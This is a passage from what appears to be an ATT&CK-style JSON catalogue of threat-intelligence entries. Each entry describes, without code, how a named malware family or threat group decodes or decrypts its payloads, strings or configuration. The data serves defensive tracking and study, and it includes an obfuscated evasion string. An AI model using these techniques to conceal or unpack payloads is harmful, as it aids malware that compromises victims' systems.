        "description": "Bisonal has decoded strings in the malware using XOR and RC4.[33][34]"
      },
      {
        "id": "S0520",
        "name": "BLINDINGCAN",
        "description": "BLINDINGCAN has used AES and XOR to decrypt its DLLs.[35]"
      },
      {
        "id": "S0635",
        "name": "BoomBox",
        "description": "BoomBox can decrypt AES-encrypted files downloaded from C2.[36]"
      },
      {
        "id": "S0415",
        "name": "BOOSTWRITE",
        "description": "BOOSTWRITE has used a a 32-byte long multi-XOR key to decode data inside its payload.[37]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER downloads encoded payloads and decodes them on the victim.[38]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 has the ability to deobfuscate its payload prior to execution.[39]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can deobfuscate C2 server responses and unpack its code on targeted hosts.[40][41]"
      },
      {
        "id": "S0482",
        "name": "Bundlore",
        "description": "Bundlore has used openssl to decrypt AES encrypted payload data. Bundlore has also used base64 and RC4 with a hardcoded key to deobfuscate data.[42]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads.[43]"
      },
      {
        "id": "C0021",
        "name": "C0021",
        "description": "During C0021, the threat actors deobfuscated encoded PowerShell commands including use of the specific string 'FromBase'+0x40+'String', in place of FromBase64String which is normally used to decode base64.[44][45]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon decrypts task and configuration files for execution.[46][47]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT decodes many of its artifacts and is decrypted (AES-128) after being downloaded.[48]"
      },
      {
        "id": "S0160",
        "name": "certutil",
        "description": "certutil has been used to decode binaries hidden inside certificate files as Base64 information.[1]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes has decrypted an AES encrypted binary file to trigger the download of other files.[49]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can decrypt downloaded modules prior to execution.[50]"
      },
      {
        "id": "S1041",
        "name": "Chinoxy",
        "description": "The Chinoxy dropping function can initiate decryption of its config file.[51]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can decrypt its encrypted internal code.[52]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can deobfuscate its payload prior to execution.[53][54]"
      },
      {
        "id": "S0611",
        "name": "Clop",
        "description": "Clop has used a simple XOR operation to decrypt strings.[55]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.[56][57]"
      },
      {
        "id": "S0369",
        "name": "CoinTicker",
        "description": "CoinTicker decodes the initially-downloaded hidden encoded file using OpenSSL.[58]"
      },
      {
        "id": "S0126",
        "name": "ComRAT",
        "description": "ComRAT has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module. ComRAT has also used a unique password to decrypt the file used for its hidden file system.[59][60]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti has decrypted its payload using a hardcoded AES-256 key.[61][62]"
      },
      {
        "id": "S0492",
        "name": "CookieMiner",
        "description": "CookieMiner has used Google Chrome's decryption and extraction operations.[63]"
      },
      {
        "id": "S0614",
        "name": "CostaBricks",
        "description": "CostaBricks has the ability to use bytecode to decrypt embedded payloads.[64]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can decode its encoded PE file prior to execution.[65]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink can decrypt and parse instructions sent from C2.[66]"
      },
      {
        "id": "S1014",
        "name": "DanBot",
        "description": "DanBot can use a VBA macro to decode its payload prior to installation and execution.[67]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel has decrypted strings and imports using RC4 during execution.[68][69]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can decrypt its payload and associated configuration elements using the Rijndael cipher.[70]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman has the ability to self-extract as a RAR archive.[71]"
      },
      {
        "id": "S0255",
        "name": "DDKONG",
        "description": "DDKONG decodes an embedded configuration using XOR.[72]"
      },
      {
        "id": "S1052",
        "name": "DEADEYE",
        "description": "DEADEYE has the ability to combine multiple sections of a binary which were broken up to evade detection into a single .dll prior to execution.[43]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis will decrypt important strings used for C&C communication.[73]"
      },
      {
        "id": "S0547",
        "name": "DropBook",
        "description": "DropBook can unarchive data downloaded from the C2 to obtain the payload and persistence modules.[74]"
      },
      {
        "id": "S0502",
        "name": "Drovorub",
        "description": "Drovorub has de-obsfuscated XOR encrypted payloads in WebSocket messages.[75]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack has used a decryption routine that is part of an executable physical patch.[76]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre decrypts resources needed for targeting the victim.[77][78]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca has used certutil to decode a string into a cabinet file.[79]"
      },
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.[80]"
      },
      {
        "id": "S0624",
        "name": "Ecipekac",
        "description": "Ecipekac has the ability to decrypt fileless loader modules.[81]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor has been decrypted before execution.[82][83]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has used a self-extracting RAR file to deliver modules to victims. Emotet has also extracted embedded executables from files using hard-coded buffer offsets.[84]"
      },
      {
        "id": "S0634",
        "name": "EnvyScout",
        "description": "EnvyScout can deobfuscate and write malicious ISO files to disk.[36]"
      },
      {
        "id": "S0401",
        "name": "Exaramel for Linux",
        "description": "Exaramel for Linux can decrypt its configuration file.[85]"
      },
      {
        "id": "S0361",
        "name": "Expand",
        "description": "Expand can be used to decompress a local or remote CAB file into an executable.[86]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke can decrypt AES encrypted C2 communications.[87]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has utilized certutil to decode base64 encoded versions of custom malware.[88]"
      },
      {
        "id": "S0355",
        "name": "Final1stspy",
        "description": "Final1stspy uses Python code to deobfuscate base64-encoded strings.[89]"
      },
      {
        "id": "S0182",
        "name": "FinFisher",
        "description": "FinFisher extracts and decrypts stage 3 malware, which is stored in encrypted resources.[90][91]"
      },
      {
        "id": "S0618",
        "name": "FIVEHANDS",
        "description": "FIVEHANDS has the ability to decrypt its payload prior to execution.[92][93][94]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb can be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key.[95]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.[96]"
      },
      {
        "id": "S0628",
        "name": "FYAnti",
        "description": "FYAnti has the ability to decrypt an embedded .NET module.[81]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader.[97][98]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can decompress and decrypt DLLs and shellcode.[52]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT has decrypted and loaded the gh0st RAT DLL into memory, once the initial dropper executable is launched.[99]"
      },
      {
        "id": "S0588",
        "name": "GoldMax",
        "description": "GoldMax has decoded and decrypted the configuration file when executed.[100][101]"
      },
      {
        "id": "S0477",
        "name": "Goopy",
        "description": "Goopy has used a polymorphic decryptor to decrypt itself at runtime.[73]"
      },
      {
        "id": "G0078",
        "name": "Gorgon Group",
        "description": "Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file.[102]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can decrypt its encrypted internal strings.[103]"
      },
      {
        "id": "S0690",
        "name": "Green Lambert",
        "description": "Green Lambert can use multiple custom routines to decrypt strings prior to execution.[104][105]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.[106]"
      },
      {
        "id": "S0499",
        "name": "Hancitor",
        "description": "Hancitor has decoded Base64 encoded URLs to insert a recipient’s name into the filename of the Word document. Hancitor has also extracted executables from ZIP files.[107][108]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can decompress and copy driver files using LZCopy.[109]"
      },
      {
        "id": "S1027",
        "name": "Heyoka Backdoor",
        "description": "Heyoka Backdoor can decrypt its payload prior to execution.[110]"
      },
      {
        "id": "S0394",
        "name": "HiddenWasp",
        "description": "HiddenWasp uses a cipher to implement a decoding function.[111]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.[112][113]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has decrypted ELF files with AES.[114]"
      },
      {
        "id": "S0398",
        "name": "HyperBro",
        "description": "HyperBro can unpack and decrypt its payload prior to execution.[53][115]"
      },
      {
        "id": "S1022",
        "name": "IceApple",
        "description": "IceApple can use a Base64-encoded AES key to decrypt tasking.[116]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has decoded malware components that are then dropped to the system.[117]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer decrypts code to connect to a remote C2 server.[118]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher.[119][120]"
      },
      {
        "id": "S0581",
        "name": "IronNetInjector",
        "description": "IronNetInjector has the ability to decrypt embedded .NET and PE payloads.[121]"
      },
      {
        "id": "S0189",
        "name": "ISMInjector",
        "description": "ISMInjector uses the certutil command to decode a payload file.[122]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has deobfuscated Base64-encoded shellcode strings prior to loading them.[123]"
      },
      {
        "id": "S0585",
        "name": "Kerrdown",
        "description": "Kerrdown can decode, decrypt, and decompress multiple layers of shellcode.[124]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel has decrypted the binary's configuration once the main function was launched.[125]"
      },
      {
        "id": "S1051",
        "name": "KEYPLUG",
        "description": "KEYPLUG can decode its configuration file to determine C2 protocols.[43]"
      },
      {
        "id": "S0526",
        "name": "KGH_SPY",
        "description": "KGH_SPY can decrypt encrypted strings and write them to a newly created folder.[126]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has decoded malicious VBScripts using Base64.[127]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos decrypts strings right after the initial communication, but before the authentication process.[128]"
      },
      {
        "id": "S0669",
        "name": "KOCTOPUS",
        "description": "KOCTOPUS has deobfuscated itself before executing its commands.[129]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI has used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process.[130][131]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs decrypts and extracts a copy of its main DLL payload when executing.[132]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.[133][134]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.[135]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron has used AES and XOR to decrypt configuration files and commands.[136]"
      },
      {
        "id": "S0513",
        "name": "LiteDuke",
        "description": "LiteDuke has the ability to decrypt and decode multiple layers of obfuscation.[87]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can decrypt its configuration data.[137]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.[138]"
      },
      {
        "id": "S0582",
        "name": "LookBack",
        "description": "LookBack has a function that decrypts malicious data.[139]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can decrypt its C2 address upon execution.[140]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete’s downloaded data is decrypted using AES.[141]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa decrypts a downloaded file using AES-128-EBC with a custom delta.[142]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can decrypt files and data.[143]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "MegaCortex has used a Base64 key to decode its components.[144]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim’s machine when dropping UPPERCUT.[145][146]"
      },
      {
        "id": "S0443",
        "name": "MESSAGETAP",
        "description": "After checking for the existence of two files, keyword_parm.txt and parm.txt, MESSAGETAP XOR decodes and read the contents of the files. [147]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can decrypt and load other modules.[143]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Upon execution, Metamorfo has unzipped itself after being downloaded to the system and has performed string decryption.[148][149][150]"
      },
      {
        "id": "S0280",
        "name": "MirageFox",
        "description": "MirageFox has a function for decrypting data containing C2 configuration information.[151]"
      },
      {
        "id": "G0021",
        "name": "Molerats",
        "description": "Molerats decompresses ZIP files once on the victim machine.[152]"
      },
      {
        "id": "S1026",
        "name": "Mongall",
        "description": "Mongall has the ability to decrypt its payload prior to execution.[110]"
      },
      {
        "id": "S0284",
        "name": "More_eggs",
        "description": "More_eggs will decode malware components that are then dropped to the system.[153]"
      },
      {
        "id": "S1047",
        "name": "Mori",
        "description": "Mori can resolve networking APIs from strings that are ADD-encrypted.[154]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater decoded base64-encoded PowerShell commands using a VBS file.[155][156][157][158]"
      },
      {
        "id": "S0637",
        "name": "NativeZone",
        "description": "NativeZone can decrypt and decode embedded  Cobalt Strike beacon stage shellcode.[36]"
      },
      {
        "id": "S0457",
        "name": "Netwalker",
        "description": "Netwalker's PowerShell script can decode and decrypt multiple layers of obfuscation, leading to the Netwalker DLL being loaded into memory.[159]"
      },
      {
        "id": "S0353",
        "name": "NOKKI",
        "description": "NOKKI uses a unique, custom de-obfuscation technique.[160]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims.[161][122][162][163]"
      },
      {
        "id": "S0439",
        "name": "Okrum",
        "description": "Okrum's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.[164]"
      },
      {
        "id": "S0052",
        "name": "OnionDuke",
        "description": "OnionDuke can use a custom decryption algorithm to decrypt strings.[87]"
      },
      {
        "id": "S0264",
        "name": "OopsIE",
        "description": "OopsIE concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.[162]"
      },
      {
        "id": "C0016",
        "name": "Operation Dust Storm",
        "description": "During Operation Dust Storm, attackers used VBS code to decode payloads.[165]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, malicious files were decoded prior to execution.[166]"
      },
      {
        "id": "C0005",
        "name": "Operation Spalax",
        "description": "For Operation Spalax, the threat actors used a variety of packers and droppers to decrypt malicious payloads.[167]"
      },
      {
        "id": "S0402",
        "name": "OSX/Shlayer",
        "description": "OSX/Shlayer can base64-decode and AES-decrypt downloaded payloads.[168] Versions of OSX/Shlayer pass encrypted and password-protected code to openssl and then write the payload to the /tmp folder.[169][170]"
      },
      {
        "id": "S0352",
        "name": "OSX_OCEANLOTUS.D",
        "description": "OSX_OCEANLOTUS.D uses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. This routine is also referenced as the rotate function in reporting.[171]"
      },
      {
        "id": "S0598",
        "name": "P.A.S. Webshell",
        "description": "P.A.S. Webshell can use a decryption mechanism to process a user supplied password and allow execution.[85]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare has decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm.[51]"
      },
      {
        "id": "S0517",
        "name": "Pillowmint",
        "description": "Pillowmint has been decompressed by included shellcode prior to being launched.[172]"
      },
      {
        "id": "S1031",
        "name": "PingPull",
        "description": "PingPull can decrypt received data from its C2 server by using AES.[173]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon can decrypt password-protected executables.[174]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.[175][53][176]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has used LZMA and base64 libraries to decode obfuscated scripts.[177]"
      },
      {
        "id": "S0518",
        "name": "PolyglotDuke",
        "description": "PolyglotDuke can use a custom algorithm to decrypt strings used by the malware.[87]"
      },
      {
        "id": "S1012",
        "name": "PowerLess",
        "description": "PowerLess can use base64 and AES ECB decryption prior to execution of downloaded modules.[178]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS can deobfuscate the main backdoor code.[157]"
      },
      {
        "id": "S1046",
        "name": "PowGoop",
        "description": "PowGoop can decrypt PowerShell scripts for execution.[154][179]"
      },
      {
        "id": "S0279",
        "name": "Proton",
        "description": "Proton uses an encrypted file to store commands and configuration values.[180]"
      },
      {
        "id": "S0613",
        "name": "PS1",
        "description": "PS1 can use an XOR key to decrypt a PowerShell loader and payload binary.[64]"
      },
      {
        "id": "S0147",
        "name": "Pteranodon",
        "description": "Pteranodon can decrypt encrypted data strings prior to using them.[181]"
      },
      {
        "id": "S0196",
        "name": "PUNCHBUGGY",
        "description": "PUNCHBUGGY has used PowerShell to decode base64-encoded assembly.[182]"
      },
      {
        "id": "S1032",
        "name": "PyDCrypt",
        "description": "PyDCrypt has decrypted and dropped the DCSrv payload to disk.[183]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can deobfuscate and re-assemble code strings for execution.[184][185][186]"
      },
      {
        "id": "S0269",
        "name": "QUADAGENT",
        "description": "QUADAGENT uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.[187]"
      },
      {
        "id": "S1076",
        "name": "QUIETCANARY",
        "description": "QUIETCANARY can use a custom parsing routine to decode the command codes and additional parameters from the C2 before executing them.[188]"
      },
      {
        "id": "S0565",
        "name": "Raindrop",
        "description": "Raindrop decrypted its Cobalt Strike payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.[189][190]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay can decrypt its payload via a XOR key.[191]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can extract its agent from the body of a malicious document.[192]"
      },
      {
        "id": "S0495",
        "name": "RDAT",
        "description": "RDAT can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.[193]"
      },
      {
        "id": "S0511",
        "name": "RegDuke",
        "description": "RegDuke can decrypt strings with a key either stored in the Registry or hardcoded in the code.[87]"
      },
      {
        "id": "S0375",
        "name": "Remexi",
        "description": "Remexi decrypts the configuration data using XOR with 25-character keys.[194]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can decode encrypted strings to enable execution of commands and payloads.[195][196][197][198][199][200]"
      },
      {
        "id": "S0258",
        "name": "RGDoor",
        "description": "RGDoor decodes Base64 strings and decrypts strings using a custom XOR algorithm.[201]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun has decrypted itself using a single-byte XOR scheme. Additionally, Rising Sun can decrypt its configuration data at runtime.[202]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke has extracted tar.gz files after downloading them from a C2 server.[203]"
      },
      {
        "id": "S0270",
        "name": "RogueRobin",
        "description": "RogueRobin decodes an embedded executable using base64 and decompresses it.[204]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can decrypt strings using the victim's hostname as the key.[205][206]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "RotaJakiro uses the AES algorithm, bit shifts in a function called rotate, and an XOR cipher to decrypt resources required for persistence, process guarding, and file locking. It also performs this same function on encrypted stack strings and the head and key sections in the network packet structure used for C2 communications.[207]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot can deobfuscate strings and files for execution.[208]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.[209][210]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic can first decrypt with the RC4 algorithm using a hardcoded decryption key before decompressing.[211]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to decrypt and decompress its payload to enable code execution.[212][213]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has decrypted a binary blob to start execution.[214]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon decrypts ciphertext using an XOR cipher and a base64-encoded string.[215]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark can extract and decrypt downloaded .zip files.[216]"
      },
      {
        "id": "S0546",
        "name": "SharpStage",
        "description": "SharpStage has decompressed data received from the C2 server.[217]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.[218]"
      },
      {
        "id": "S0589",
        "name": "Sibot",
        "description": "Sibot can decrypt data received from a C2 and save to a file.[100]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist can decode and decrypt messages received from C2.[219]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape has decrypted the password of the C2 server with a simple byte by byte XOR. Siloscape also writes both an archive of Tor and the unzip binary to disk from data embedded within the payload using Visual Studio’s Resource Manager.[220]"
      },
      {
        "id": "S0468",
        "name": "Skidmap",
        "description": "Skidmap has the ability to download, unpack, and decrypt tar.gz files .[221]"
      },
      {
        "id": "S0226",
        "name": "Smoke Loader",
        "description": "Smoke Loader deobfuscates its code.[222]"
      },
      {
        "id": "S1086",
        "name": "Snip3",
        "description": "Snip3 can decode its second-stage PowerShell script prior to execution.[223]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware.[189]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT can run upload to decrypt and upload files from storage.[64][93]"
      },
      {
        "id": "S0516",
        "name": "SoreFang",
        "description": "SoreFang can decode and decrypt exfiltrated data sent to C2.[224]"
      },
      {
        "id": "S0543",
        "name": "Spark",
        "description": "Spark has used a custom XOR algorithm to decrypt the payload.[225]"
      },
      {
        "id": "S0390",
        "name": "SQLRat",
        "description": "SQLRat has scripts that are responsible for deobfuscating additional scripts.[226]"
      },
      {
        "id": "S1030",
        "name": "Squirrelwaffle",
        "description": "Squirrelwaffle has decrypted files and payloads using a XOR-based algorithm.[227][228]"
      },
      {
        "id": "S0188",
        "name": "Starloader",
        "description": "Starloader decrypts and executes shellcode from a file called Stars.jps.[229]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet decrypts resources that are loaded into memory and executed.[230]"
      },
      {
        "id": "S0562",
        "name": "SUNSPOT",
        "description": "SUNSPOT decrypts SUNBURST, which was stored in AES128-CBC encrypted blobs.[231]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can deobfuscate packed binaries in memory.[115]"
      },
      {
        "id": "G0092",
        "name": "TA505",
        "description": "TA505 has decrypted packed DLLs with an XOR key.[232]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor can use a stream cipher to decrypt stings used by the malware.[233]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has used a script that decodes a Base64-encoded version of WeaveWorks Scope.[234]"
      },
      {
        "id": "S0560",
        "name": "TEARDROP",
        "description": "TEARDROP was decoded using a custom rolling XOR algorithm to execute a customized Cobalt Strike payload.[235][236][190]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.[237]"
      },
      {
        "id": "S0665",
        "name": "ThreatNeedle",
        "description": "ThreatNeedle can decrypt its payload using RC4, AES, or one-byte XORing.[238]"
      },
      {
        "id": "S0678",
        "name": "Torisma",
        "description": "Torisma has used XOR and Base64 to decode C2 data.[239]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot decodes the configuration data and modules.[240][241][242]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload.[243][244]"
      },
      {
        "id": "S0436",
        "name": "TSCookie",
        "description": "TSCookie has the ability to decrypt, load, and execute a DLL and its resources.[245]"
      },
      {
        "id": "S0647",
        "name": "Turian",
        "description": "Turian has the ability to use a XOR decryption key to extract C2 server domains and IP addresses.[246]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads.[247]"
      },
      {
        "id": "S0263",
        "name": "TYPEFRAME",
        "description": "One TYPEFRAME variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\".[248]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can decrypt command parameters sent through C2 and use unpacking code to extract its packed executable.[249]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.[250]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak has the ability to decode and decrypt downloaded files.[251][252]"
      },
      {
        "id": "S0636",
        "name": "VaporRage",
        "description": "VaporRage can deobfuscate XOR-encoded shellcode prior to execution.[36]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN decrypts code, strings, and commands to use once it's on the victim's machine.[253]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer deobfuscates its strings and APIs once its executed.[254]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can use XOR 0x45 to decrypt obfuscated code.[255]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "WastedLocker's custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.[256]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear has the ability to decrypt its RC4 encrypted payload for execution.[257]"
      },
      {
        "id": "S0515",
        "name": "WellMail",
        "description": "WellMail can decompress scripts received from C2.[258]"
      },
      {
        "id": "S0514",
        "name": "WellMess",
        "description": "WellMess can decode and decrypt data received from C2.[259][260][261]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate can deobfuscate downloaded files stored in reverse byte order and decrypt embedded resources using multiple XOR operations.[262][263]"
      },
      {
        "id": "S0466",
        "name": "WindTail",
        "description": "WindTail has the ability to decrypt strings using hard-coded AES keys.[264]"
      },
      {
        "id": "S0430",
        "name": "Winnti for Linux",
        "description": "Winnti for Linux has decoded XOR encoded strings holding its configuration upon execution.[265]"
      },
      {
        "id": "S0141",
        "name": "Winnti for Windows",
        "description": "The Winnti for Windows dropper can decrypt and decompresses a data blob.[266]"
      },
      {
        "id": "G0090",
        "name": "WIRTE",
        "description": "WIRTE has used Base64 to decode malicious VBS script.[267]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can deobfuscate Base64-encoded strings and scripts.[268]"
      },
      {
        "id": "S0653",
        "name": "xCaon",
        "description": "xCaon has decoded strings from the C2 server before executing commands.[269]"
      },
      {
        "id": "S0388",
        "name": "YAHOYAH",
        "description": "YAHOYAH decrypts downloaded files before execution.[270]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy decodes its secondary payload and writes it to the victim’s machine. Zebrocy also uses AES and XOR to decrypt strings and payloads.[271][272]"
      },
      {
        "id": "S0230",
        "name": "ZeroT",
        "description": "ZeroT shellcode decrypts and decompresses its RC4-encrypted payload.[273]"
      },
      {
